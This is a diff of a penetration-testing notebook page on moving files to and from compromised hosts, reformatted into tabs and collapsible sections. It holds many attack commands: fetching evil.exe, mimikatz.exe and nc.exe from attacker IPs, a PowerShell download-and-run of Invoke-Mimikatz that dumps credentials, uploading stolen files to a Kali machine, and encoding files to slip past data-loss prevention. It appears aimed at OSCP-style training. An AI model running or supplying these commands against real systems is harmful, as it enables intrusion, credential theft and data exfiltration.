@@ -2,6 +2,10 @@
 
 ## **Guides and Resources**
 
+<details>
+
+<summary>Guides and Resources</summary>
+
 * [https://book.hacktricks.xyz/exfiltration](https://book.hacktricks.xyz/exfiltration)
 * [https://awakened1712.github.io/oscp/oscp-transfer-files/](https://awakened1712.github.io/oscp/oscp-transfer-files/)
 * [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
@@ -11,26 +15,30 @@
 * [https://xapax.github.io/security/#transferring\_files/transfering\_files/](https://xapax.github.io/security/#transferring\_files/transfering\_files/)
 * [https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/](https://xapax.github.io/security/#attacking\_active\_directory\_domain/good\_to\_know/transferring\_files/)
 
+</details>
+
 ## Encode a file
 
-DLP sucks
+DLP sucks. Encode your files to make file transfer easier
 
-* Linux with base64
-
+{% tabs %}
+{% tab title="base64" %}
 ```
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
+{% endtab %}
 
-* Windows with certutil
-
+{% tab title="certutil" %}
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
 ```
 
-* **File Encoding - uuencode**
 
+{% endtab %}
+
+{% tab title="uuencode" %}
 Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).
 
 Encode:
@@ -52,9 +60,9 @@ begin 644 issue-net-COPY
 `
 end
 ```
+{% endtab %}
 
-* **File Encoding - openssl**
-
+{% tab title="openssl" %}
 Openssl can be used when uu/decode/encode is not available on the remote system:
 
 Encode:
@@ -70,8 +78,10 @@ Cut & paste the output into this command:
 $ openssl base64 -d >issue.net-COPY
 ```
 
-* **File Encoding - xxd**
 
+{% endtab %}
+
+{% tab title="xxd" %}
 ..and if neither _uuencode_ nor _openssl_ is available then we have to dig a bit deeper in our trick box and use _xxd_.
 
 Encode:
@@ -86,9 +96,9 @@ Cut & paste the output into this command: Decode:
 ```
 $ xxd -p -r >issue.net-COPY
 ```
+{% endtab %}
 
-* **File Encoding - Multiple Binaries**
-
+{% tab title="Multiple Binaries" %}
 Method 1: Using _shar_ to create a self extracting shell script with binaries inside:
 
 ```
@@ -114,16 +124,20 @@ Transfer _stuff.tgz.b64_ to the remote system and execute:
 openssl base64 -d <stuff.tgz.b64 | tar xfz -
 ```
 
+
+{% endtab %}
+{% endtabs %}
+
 ## HTTP/HTTPS
 
-Find a directory on target you can write to.
+One of the easier ways to transfer a file as most devices have http/S access. We start by finding a directory on target you can write to.
 
 ```
 # find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
 ```
 
-### Wget - Grab URL
-
+{% tabs %}
+{% tab title="Wget - Grab URL" %}
 ```
 (Linux) Uses HTTP and FTP
 # wget http://<url> -O url.txt -o /dev/null
@@ -131,17 +145,17 @@ Find a directory on target you can write to.
 (Windows) wget script
 > cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
 ```
+{% endtab %}
 
-### Curl - Grab URL
-
+{% tab title="Curl - Grab URL" %}
 Can transfer with IMAP, POP3, SCP, SFTP, SMB, SMTP, TELNET, TFTP< and others
 
 ```
 # curl -o file.txt http://url.com
 ```
+{% endtab %}
 
-### SimpleHTTPServer
-
+{% tab title="SimpleHTTPServer" %}
 [SimpleHTTPServerWithUpload](https://gist.github.com/UniIsland/3346170)
 
 * SimpleHTTPServer is a Python module which allows you to instantly create a web server in the current working directory. Not only is it useful for web developers to test their websites locally without having to worry about javascript errors, it can be a useful tool for pentesters when dealing with web applications.
@@ -161,10 +175,10 @@ Can transfer with IMAP, POP3, SCP, SFTP, SMB, SMTP, TELNET, TFTP< and others
       * \> IEX(New-Object Net.WebClient).DownloadString('http://10.102.10.91:1234/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds
   * Set up a simple HTTP server and pull files from it on to target
     * (Attacker) # python -m [SimpleHTTPServer](https://app.gitbook.com/s/-MQCNQTNhvnXD58Vo8Mf/red-offensive/The\_Red\_Notebook--ToolBox--SimpleHTTPServer.html) 80
-    * (Target) # wget [http://attackerip/file](http://attackerip/file)
+    * (Target) # wget [http://attackerip/fil](http://attackerip/file)
+{% endtab %}
 
-### HTTPS Server
-
+{% tab title="HTTPS Server" %}
 ```
 # from https://gist.github.com/dergachev/7028596
 # taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
@@ -182,6 +196,8 @@ httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPR
 httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
 httpd.serve_forever()
 ```
+{% endtab %}
+{% endtabs %}
 
 ## SMB
 
@@ -189,22 +205,22 @@ httpd.serve_forever()
 
 ## FTP
 
-### Python Server
-
+{% tabs %}
+{% tab title="Python Server" %}
 ```
 #pip3 install pyftpdlib
 #python3 -m pyftpdlib -p 21
 ```
+{% endtab %}
 
-### NodeJS Server
-
+{% tab title="NodeJS Server" %}
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
 ```
+{% endtab %}
 
-### Pure-FTP Server
-
+{% tab title="Pure-FTP Server" %}
 ```
 # sudo apt update && sudo apt install pure-ftpd
 ```
@@ -223,9 +239,9 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
+{% endtab %}
 
-### WIndows Client
-
+{% tab title="WIndows Client" %}
 ```
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -236,8 +252,14 @@ echo GET mimikatz.exe >> ftp.txt
 echo bye >> ftp.txt
 ftp -n -v -s:ftp.txt
 ```
+{% endtab %}
+{% endtabs %}
 
 ## TFTP
+
+<details>
+
+<summary>TFTP</summary>
 
 * \# In Kali #atftpd --daemon --port 69 /tftp
 * \# In reverse shell #tftp -i 10.10.10.10 GET nc.exe
@@ -247,6 +269,8 @@ ftp -n -v -s:ftp.txt
   * \# sudo chown nobody: /tftp
   * \# sudo atftpd --daemon --port 69 /tftp
   * \# tftp -i 10.11.0.4 put important.docx
+
+</details>
 
 ## SCP
 
@@ -273,11 +297,21 @@ Put file
 
 ## Non-interactive shell
 
+<details>
+
+<summary>Non-interactive shell</summary>
+
 * Most netcat like tools provide a non-interactive shell, little to no feedback. File tranfer tools generally do not work.
+
+<!---->
+
 * Upgrading a shell
   * Python interpreter coes with a standard module called pty for creating pseudo-terminals. We can spawn a separate process form our remote shell to get a fully interactive shell
   * \# nc -vn 10.11.0.128 4444
   * \# python -c 'import pty; pty.spawn("/bin/bash")'
+
+<!---->
+
 * Non-interactive FTP download
   * \# sudo cp /usr/share/windows-resources/binaries/nc.exe /ftphome/
   * \# ls /ftphome/
@@ -293,7 +327,13 @@ Put file
     * \> ftp -v -n -s:ftp.txt
   * \> nc.exe
 
+</details>
+
 ## Powershell
+
+<details>
+
+<summary>Powershell</summary>
 
 * Simple Powershell download
   * For more modern windows versions, we can use PowerShell as an even simpler download alternative, System.Net.WebClient class
@@ -318,7 +358,13 @@ Put file
     * \# exe2hex -x nc.exe -p nc.cmd
   * Now when we copy and paste the script into a shell on our windows device, it will create a perfectly working copy of nc.exe
 
+</details>
+
 ## Uploads with windows scripting languages
+
+<details>
+
+<summary>Uploads with windows scripting languages</summary>
 
 * We can use the System.Net.WebClient powershell class to upload data to our kali machine with an HTTP POST request
 * With this we will make a php script in /var/www/html
@@ -333,9 +379,17 @@ Put file
   * \#ps -ef | grep apache
   * \#sudo chown www-data: /var/www/uploads
   * \#ls -la
-* With Apache and the php script ready we move to our compromised windows host and invoke the up
+* With Apache and the php script ready we move to our compromised windows host and invoke the upload
+
+</details>
 
 ## WGET.VBS
+
+WGET Built into a visual basic script
+
+<details>
+
+<summary>WGET.VBS</summary>
 
 ```
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs 
@@ -359,15 +413,25 @@ echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vb
 echo Next >> wget.vbs echo ts.Close >> wget.vbs
 ```
 
-## **File transfer - using **_**screen**_** from REMOTE to LOCAL**
+
+
+</details>
+
+## **File transfer - using **_**screen**_** **&#x20;
+
+<details>
+
+<summary>File transfer - using screen </summary>
+
+### File transfer - using screen from REMOTE to LOCAL
 
 Transfer a file FROM the remote system to your local system:
 
 Have a _screen_ running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:
 
-> CTRL-a : logfile screen-xfer.txt
+CTRL-a : logfile screen-xfer.txt
 
-> CTRL-a H
+CTRL-a H
 
 We use _openssl_ to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and _screen_ will write this data to _screen-xfer.txt_:
 
@@ -377,7 +441,7 @@ openssl base64 </etc/issue.net
 
 Stop your local screen from logging any further data:
 
-> CTRL-a H
+CTRL-a H
 
 On your local computer and from a different shell decode the file:
 
@@ -402,17 +466,23 @@ openssl base64 -d
 
 Get _screen_ to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:
 
-> CTRL-a : readbuf screen-xfer.txt
+CTRL-a : readbuf screen-xfer.txt
 
-> CTRL-a : paste .
+CTRL-a : paste .
 
-> CTRL-d
+CTRL-d
 
-> CTRL-d
+CTRL-d
 
 Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
+</details>
+
 ## **File transfer - using gs-netcat and sftp**
+
+<details>
+
+<summary>File transfer - using gs-netcat and sftp</summary>
 
 Use [gs-netcat](https://github.com/hackerschoice/gsocket) and encapsulate the sftp protocol within. It uses the Global Socket Relay Network and no central server or IP address is required to connect to the SFTP/Gsocket server (just a password hash).
 
@@ -426,3 +496,5 @@ From your workstation execute this command to connect to the SFTP server:
 export GSOCKET_ARGS="-s MySecret"                        # Workstation
 sftp -D gs-netcat                                        # Workstation
 ```
+
+</details>
